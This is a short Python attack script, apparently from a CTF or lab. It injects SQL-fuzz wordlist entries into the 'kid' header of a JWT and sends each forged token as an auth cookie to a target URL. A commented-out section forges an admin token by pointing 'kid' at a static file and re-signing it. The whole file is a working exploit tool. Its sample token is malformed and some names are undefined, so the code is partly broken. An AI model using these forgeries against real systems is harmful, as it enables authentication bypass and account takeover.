#! /usr/bin/python3
import base64
import json
import requests

jwt_token = "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiI.2B9ZKzJ3FeJ9"
wordlist = 'sql-fuzz.txt'
target_url = 'TARGET_URL'

def kid_fuzz():
    header, payload, signature = jwt_token.split('.')
    header_decoded = base64.b64decode(header + "==").decode('utf-8')
    payload_decoded = base64.b64decode(payload + "==").decode('utf-8')
    header_dict = json.loads(header_decoded)
    payload_dict = json.loads(payload_decoded)

    with open(wordlist, 'r') as f:
        for w in f:
            w = w.strip()
            header_dict["kid"] = w # update kid value to our fuzz word
            header_rem_space = json.dumps(header_dict).replace(" ", "").encode() # convert dictionary to json, remove whitespace b/w, encode as bytes
            header_encoded = base64.urlsafe_b64encode(header_rem_space).decode('UTF-8').replace("=","")  # Base64 encode
            payload_rem_space = json.dumps(payload_dict).replace(" ", "")
            token = f"{header_encoded}.{payload}.{signature}"
            print(f"Header: {header_rem_space}")
            print(f"Payload: {payload_rem_space}")
            print(f"JWT: {token}")

            response = requests.get(target_url, cookies={'auth':token}, allow_redirects=True)
            print(f"\033[92mResponse: {response.text}\033[0m")

kid_fuzz()

# def get_jwt(header, payload):
#     header_decoded = base64.urlsafe_b64decode(header + "==")
#     payload_decoded = base64.urlsafe_b64decode(payload + "==")

#     header_dict = json.loads(header_decoded)
#     payload_dict = json.loads(payload_decoded)

#     header_dict["kid"] = "bootstrap.css"
#     # print(header_dict)
#     payload_dict["user"] = "admin"
#     # print(payload_dict)

#     header_rem_space = json.dumps(header_dict).replace(" ", "").encode() # convert dictionary to json, remove whitespace b/w, encode as bytes
#     print(header_rem_space)
#     payload_rem_space = json.dumps(payload_dict).replace(" ", "").encode()
#     print(payload_rem_space)

#     header_encoded = base64.urlsafe_b64encode(header_rem_space).decode('UTF-8').replace("=","")
#     # print(header_encoded)
#     payload_encoded = base64.urlsafe_b64encode(payload_rem_space).decode('UTF-8').replace("=","")

#     msg = str(header_encoded) + "." + str(payload_encoded)
#     sign_msg= hmac.new(key.encode(), msg.encode(), sha256).digest()
#     signature_encoded = base64.urlsafe_b64encode(sign_msg).decode('UTF-8').replace("=", "")

#     token = f"{header_encoded}.{payload_encoded}.{signature_encoded}"
#     print(token)
#     response = requests.get('URL', cookies={'auth':token}, allow_redirects=True)
#     print(response.text)

# # kid_fuzz(header, payload)
# get_jwt(header, payload)

